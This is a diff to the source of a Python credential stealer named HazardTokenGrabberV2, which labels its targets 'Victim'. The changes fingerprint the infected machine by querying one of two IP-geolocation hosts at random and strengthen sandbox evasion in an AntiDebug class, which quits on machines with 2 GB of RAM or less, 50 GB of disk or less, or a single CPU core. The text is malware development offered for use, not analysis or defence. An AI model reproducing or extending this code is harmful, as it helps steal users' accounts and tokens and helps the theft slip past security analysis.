@@ -13,6 +13,7 @@ import subprocess
 
 from sys import argv
 from PIL import ImageGrab
+from random import choice
 from base64 import b64decode
 from tempfile import mkdtemp
 from re import findall, match
@@ -71,8 +72,11 @@ config = {
     ]
 
 }
+# global variables
 Victim = os.getlogin()
 Victim_pc = os.getenv("COMPUTERNAME")
+ram = str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]
+disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
 
 
 class Functions(object):
@@ -483,10 +487,11 @@ class HazardTokenGrabberV2(Functions):
         w = self.getProductValues()
         wname = w[0].replace(" ", "᠎ ")
         wkey = w[1].replace(" ", "᠎ ")
-        ram = str(psutil.virtual_memory()[0]/1024 ** 3).split(".")[0]
-        disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
 
-        data = httpx.get("https://ipinfo.io/json").json()
+        links = ["https://ipinfo.io/json", "https://utilities.tk/network/info"]
+        link = choice(links)
+        data = httpx.get(link).json()
+
         ip = data.get('ip')
         city = data.get('city')
         country = data.get('country')
@@ -648,7 +653,9 @@ class AntiDebug(Functions):
                 self.programExit()
 
     def specsCheck(self):
-        disk = str(psutil.disk_usage('/')[0]/1024 ** 3).split(".")[0]
+        # would not recommend changing this to over 2gb since some actually have 3gb of ram
+        if int(ram) <= 2:  # 2gb or less ram
+            self.programExit()
         if int(disk) <= 50:  # 50gb or less disc space
             self.programExit()
         if int(psutil.cpu_count()) <= 1:  # 1 or less cpu cores
